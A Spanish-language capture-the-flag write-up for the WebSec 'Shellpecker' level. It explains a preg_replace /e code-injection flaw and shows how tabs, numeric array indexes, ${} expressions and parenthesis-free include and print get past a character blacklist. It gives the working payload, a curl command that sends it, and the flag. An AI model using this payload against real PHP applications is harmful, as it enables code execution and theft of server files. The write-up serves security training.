# SOLUCIÓN WEBSEC LEVEL05 - The magical Shellpecker!

## FLAG
```
WEBSEC{Writing_a_sp3llcheckEr_in_php_aint_no_fun}
```

## RESUMEN DE LA VULNERABILIDAD

La aplicación usa **`preg_replace()` con el modificador `/e`** (deprecated), que es extremadamente peligroso porque **evalúa el segundo parámetro como código PHP**.

### Código vulnerable:
```php
$q = substr($_REQUEST['q'], 0, 256);  
$blacklist = implode(["'", '"', '(', ')', ' ', '`']);

$corrected = preg_replace("/([^$blacklist]{2,})/ie", 'correct ("\\1")', $q);
```

## ANÁLISIS

### Blacklist:
Caracteres bloqueados en el input:
- `'` - comilla simple
- `"` - comilla doble  
- `(` - paréntesis izquierdo
- `)` - paréntesis derecho
- ` ` - espacio
- `` ` `` - backtick

### El modificador /e:
Con `/e`, preg_replace evalúa el replacement como código PHP. El código ejecutado es:
```php
eval('correct("captura")');
```

Donde "captura" es cada secuencia de 2+ caracteres que no están en la blacklist.

## EXPLOTACIÓN

### Desafío principal:
Necesitamos ejecutar código PHP pero:
1. No podemos usar paréntesis para llamar funciones
2. No podemos usar comillas para strings
3. No podemos usar espacios

### Solución - Bypass de restricciones:

#### 1. **Usar TAB en lugar de espacios**
Los tabs (`\t`) NO están bloqueados y PHP los acepta como separadores.

#### 2. **Usar arrays con índices numéricos** 
`$_POST[0]` funciona sin comillas porque `0` es un número, no necesita comillas.

#### 3. **Usar `${...}` para evaluación de expresiones**
La sintaxis `${expr}` en PHP permite evaluar expresiones dentro de strings.

#### 4. **Usar `include` sin paréntesis**
`include` es un language construct, no una función, así que puede usarse sin paréntesis:
```php
include $variable;  // válido sin ()
```

#### 5. **Usar `print` sin paréntesis**
Similar a `include`, `print` y `echo` no requieren paréntesis.

### Payload final:
```
q=${@include\t$_POST[0]}${@print\t$flag}&0=flag.php
```

Donde `\t` representa un TAB real.

### Cómo funciona:

1. **`${@include\t$_POST[0]}`**:
   - Incluye el archivo especificado en `$_POST[0]` (que es `flag.php`)
   - Esto carga la variable `$flag` en el scope

2. **`${@print\t$flag}`**:
   - Imprime el valor de la variable `$flag`
   - El `@` suprime errores

3. **`&0=flag.php`**:
   - Pasa el nombre del archivo por POST con índice numérico `0`

## COMANDO COMPLETO:
```bash
printf 'q=${@include\t$_POST[0]}${@print\t$flag}&0=flag.php' | \
curl -s -X POST "https://websec.fr/level05/index.php" --data-binary @-
```

## LECCIONES APRENDIDAS

1. **NUNCA usar `preg_replace` con modificador `/e`**:
   - Está deprecado desde PHP 5.5
   - Removido en PHP 7.0
   - Usar `preg_replace_callback()` en su lugar

2. **Las blacklists son difíciles de implementar correctamente**:
   - Bloquearon espacios pero no tabs
   - Bloquearon paréntesis pero no consideraron language constructs
   - Bloquearon comillas pero no índices numéricos de arrays

3. **Defense in depth**:
   - Una sola capa de seguridad (la blacklist) no es suficiente
   - Debería validarse y sanitizarse el input en múltiples niveles

## ARCHIVOS CREADOS
- `analisis.txt` - Análisis inicial de la vulnerabilidad
- `exploit_strategy.txt` - Estrategias de explotación probadas
- `test_preg.php` - Scripts de prueba local
- `response.html` - Respuesta del servidor
- `FLAG.txt` - La flag obtenida
- `SOLUCION.md` - Este archivo